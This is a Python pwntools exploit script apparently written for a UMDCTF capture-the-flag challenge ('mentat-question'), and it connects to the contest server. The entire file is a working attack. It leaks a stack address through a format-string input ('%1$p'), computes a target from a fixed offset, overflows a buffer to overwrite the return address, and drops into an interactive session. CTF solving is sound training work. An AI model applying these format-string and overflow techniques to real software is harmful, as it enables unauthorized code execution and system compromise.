#!/usr/bin/env python3

from pwn import *

exe = ELF("./mentat-question")

context.binary = exe

def get_past_intro(p):
    p.recvuntil(b'What would you like today?')
    p.recvline()

    p.sendline(b'Division')

def get_leak(p):
    p.recvuntil(b'Which numbers would you like divided?')
    p.recvline()

    p.sendline(b'0')
    p.sendline(b'AA\n')

    p.recvuntil(b'Would you like to try again?')
    p.recvline()
    
    p.sendline(b'Yes %1$p')
    leak = p.recvline()
    leaks = leak.split(b' ')
    leak = int(leaks[4].decode(), 16)

    return leak - 3728

def solve(p, leak):
    p.recvuntil(b'Which numbers would you like divided?')
    p.recvline()

    p.sendline(b'0')
    p.sendline(b'AA\n')

    p.recvuntil(b'Would you like to try again?')
    p.recvline()
    
    payload = b'YesAAAAAAAABBBBBBBBCCCCC'
    payload += p64(leak)

    p.sendline(payload)

    print(p.recvline())

def pwn(p):
    get_past_intro(p)
    leak = get_leak(p)
    print(hex(leak))
    solve(p, leak)
    p.interactive()

def conn():
    args.LOCAL = False
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.umdctf.io", 32300)

    return r

def main():
    r = conn()

    # good luck pwning :)
    pwn(r)

if __name__ == "__main__":
    main()
